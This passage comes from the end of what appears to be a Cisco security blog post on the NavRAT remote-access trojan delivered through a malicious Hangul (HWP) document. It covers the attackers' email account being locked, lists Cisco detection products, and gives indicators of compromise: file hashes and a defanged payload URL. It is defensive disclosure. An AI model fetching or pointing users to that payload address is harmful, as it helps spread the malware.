an attacker's point of view. It's really hard to identify the malicious traffic in the middle of the legitimate traffic. In this case, the email provider locked the account due to attempts from too many different countries to access the email inbox. We identified the sample on several public sandbox systems, and we assume the multiple connection attempts were performed by these sandboxes. \nCoverage   \nAdditional ways our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. \nCWSor WSA web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such asNGFW,NGIPS, andMeraki MX can detect malicious activity associated with this threat. \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether user are on or off the corporate network. \nOpen-source Snort subscriber rule set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nIOCs   \nMalicious HWP:   \ne5f191531bc1c674ea74f8885449f4d934d5f1aa7fd3aaa283fe70f9402b9574 \nNavRAT: 4f06eaed3dd67ce31e7c8258741cf727964bd271c3590ded828ad7ba8d04ee57 \nOnline Payload: hxxp://artndesign2[.]cafe24[.]com:80/skin_board/s_build_cafeblog/exp_include/img.png 2016 NavRAT sample: e0257d187be69b9bee0a731437bf050d56d213b50a6fd29dd6664e7969f286ef \nSHARE THIS POST \nINTELLIGENCE CENTER Intelligence Search Email & Spam Trends \nVULNERABILITY RESEARCH Vulnerability Reports Microsoft Advisories ", "source": "Cisco"}]